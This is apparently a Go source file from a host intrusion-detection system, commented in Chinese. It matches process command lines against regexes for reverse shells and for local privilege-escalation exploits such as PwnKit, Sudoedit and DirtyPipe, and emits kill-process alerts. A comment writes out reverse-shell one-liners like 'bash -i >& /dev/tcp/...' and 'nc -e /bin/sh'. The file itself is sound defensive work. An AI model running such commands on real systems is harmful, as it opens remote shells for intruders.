package intrusion

import (
	"context"
	"encoding/json"
	"regexp"
	"strings"
)

// ReverseShellDetector 检测进程命令行中的反弹 shell 模式。
//
// 命中模式包括 (实战常见):
//   - bash -i >& /dev/tcp/x.x.x.x/port 0>&1
//   - nc -e /bin/sh
//   - python -c 'import socket,subprocess,os; ...'
//   - perl -e 'use Socket; ...'
//   - php -r '$sock=fsockopen(...)'
//   - awk 'BEGIN { ... /inet/tcp/0/...}'
//   - powershell base64 -enc + IEX (Windows 端,虽不做但留模式)
type ReverseShellDetector struct {
	patterns []*revShellPattern
}

type revShellPattern struct {
	Name     string
	Regex    *regexp.Regexp
	Severity string
	Hint     string
}

// NewReverseShellDetector 构造内置模式集。
func NewReverseShellDetector() *ReverseShellDetector {
	return &ReverseShellDetector{
		patterns: []*revShellPattern{
			{
				Name:     "BASH_DEV_TCP",
				Severity: "critical",
				Regex:    regexp.MustCompile(`bash\s+-i\s+>&\s*/dev/tcp/`),
				Hint:     "bash 经典反弹 shell",
			},
			{
				Name:     "NC_EXEC",
				Severity: "critical",
				Regex:    regexp.MustCompile(`(?i)\bnc(\.\S+)?\s+(-e|--exec)\s+`),
				Hint:     "ncat -e 直接执行 shell",
			},
			{
				Name:     "PYTHON_SOCKET",
				Severity: "critical",
				Regex:    regexp.MustCompile(`python\d?\s+-c\s+['"]import\s+socket(?:,\s*subprocess)?`),
				Hint:     "python 反弹 shell (socket+subprocess)",
			},
			{
				Name:     "PERL_SOCKET",
				Severity: "critical",
				Regex:    regexp.MustCompile(`perl\s+-e\s+['"]use\s+Socket`),
				Hint:     "perl Socket 反弹",
			},
			{
				Name:     "PHP_FSOCKOPEN",
				Severity: "critical",
				Regex:    regexp.MustCompile(`php\s+-r\s+['"][^'"]*fsockopen`),
				Hint:     "php fsockopen 反弹",
			},
			{
				Name:     "AWK_INET",
				Severity: "high",
				Regex:    regexp.MustCompile(`awk\s+['"]BEGIN[^'"]*inet`),
				Hint:     "awk inet tcp 反弹",
			},
			{
				Name:     "POWERSHELL_ENC",
				Severity: "high",
				Regex:    regexp.MustCompile(`(?i)powershell.+?-enc(odedcommand)?\s+[A-Za-z0-9+/=]{30,}`),
				Hint:     "PowerShell -enc 编码命令 (常见于 fileless)",
			},
		},
	}
}

// ProcessEvent 是单次进程执行事件 (Agent eBPF 上报)。
type ProcessEvent struct {
	HostID   string
	PID      int32
	PPID     int32
	UID      int32
	ExePath  string
	Cmdline  string
	UserName string
}

// Scan 检测进程命令行中的反弹 shell 模式。
func (d *ReverseShellDetector) Scan(_ context.Context, ev ProcessEvent) ([]byte, bool) {
	if ev.Cmdline == "" {
		return nil, false
	}

	for _, p := range d.patterns {
		if !p.Regex.MatchString(ev.Cmdline) {
			continue
		}
		payload, _ := json.Marshal(map[string]any{
			"host_id":  ev.HostID,
			"pid":      ev.PID,
			"ppid":     ev.PPID,
			"uid":      ev.UID,
			"username": ev.UserName,
			"exe":      ev.ExePath,
			"cmdline":  ev.Cmdline,
			"rule":     p.Name,
			"hint":     p.Hint,
			"would_action": map[string]any{
				"type":   "kill_pid",
				"target": ev.PID,
				"reason": "反弹 shell 模式命中: " + p.Hint,
			},
		})
		return payload, true
	}
	return nil, false
}

// PrivEscalationDetector 检测本地提权常见模式。
//
// 模式集 (本 PR 简化):
//   - 非 root 用户调用 setuid/setgid
//   - chmod u+s (chmod 4xxx) 写入到非系统目录
//   - sudo 凭据缓存利用
//   - exploit known: pwnkit (PolKit) / dirty pipe / Sudoedit (CVE-2021-3156)
type PrivEscalationDetector struct {
	patterns []*revShellPattern
}

// NewPrivEscalationDetector 构造。
func NewPrivEscalationDetector() *PrivEscalationDetector {
	return &PrivEscalationDetector{
		patterns: []*revShellPattern{
			{
				Name:     "CHMOD_SETUID_WRITE",
				Severity: "high",
				Regex:    regexp.MustCompile(`chmod\s+(?:[ugoa]?\+s|4\d{3,4})\s`),
				Hint:     "chmod +s 设置 setuid 位",
			},
			{
				Name:     "PWNKIT_PATTERN",
				Severity: "critical",
				Regex:    regexp.MustCompile(`(?i)(pkexec|polkit)`),
				Hint:     "PolKit/pkexec 提权 (CVE-2021-4034 PwnKit)",
			},
			{
				Name:     "SUDOEDIT_PATTERN",
				Severity: "critical",
				Regex:    regexp.MustCompile(`(?i)sudoedit.*\\`),
				Hint:     "Sudoedit 提权 (CVE-2021-3156)",
			},
			{
				Name:     "DIRTY_PIPE_PATTERN",
				Severity: "critical",
				Regex:    regexp.MustCompile(`/proc/self/.*splice`),
				Hint:     "DirtyPipe 提权 (CVE-2022-0847)",
			},
		},
	}
}

// Scan 检测进程提权模式。
func (d *PrivEscalationDetector) Scan(_ context.Context, ev ProcessEvent) ([]byte, bool) {
	if ev.Cmdline == "" {
		return nil, false
	}
	for _, p := range d.patterns {
		if !p.Regex.MatchString(ev.Cmdline) {
			continue
		}
		payload, _ := json.Marshal(map[string]any{
			"host_id":  ev.HostID,
			"pid":      ev.PID,
			"uid":      ev.UID,
			"username": ev.UserName,
			"exe":      ev.ExePath,
			"cmdline":  ev.Cmdline,
			"rule":     p.Name,
			"hint":     p.Hint,
			"would_action": map[string]any{
				"type":   "kill_pid",
				"target": ev.PID,
				"reason": "本地提权模式命中: " + p.Hint,
			},
		})
		return payload, true
	}
	return nil, false
}

// ParseProcessEventFromFields 从 ev.fields 提取 ProcessEvent。
//
// 期望字段: pid / ppid / uid / exe / cmdline / username。
func ParseProcessEventFromFields(hostID string, fields map[string]string) *ProcessEvent {
	if hostID == "" || fields["cmdline"] == "" {
		return nil
	}
	return &ProcessEvent{
		HostID:   hostID,
		PID:      atoi32(fields["pid"]),
		PPID:     atoi32(fields["ppid"]),
		UID:      atoi32(fields["uid"]),
		ExePath:  fields["exe"],
		Cmdline:  fields["cmdline"],
		UserName: strings.TrimSpace(fields["username"]),
	}
}

func atoi32(s string) int32 {
	var n int32
	for _, c := range s {
		if c < '0' || c > '9' {
			break
		}
		n = n*10 + int32(c-'0')
	}
	return n
}
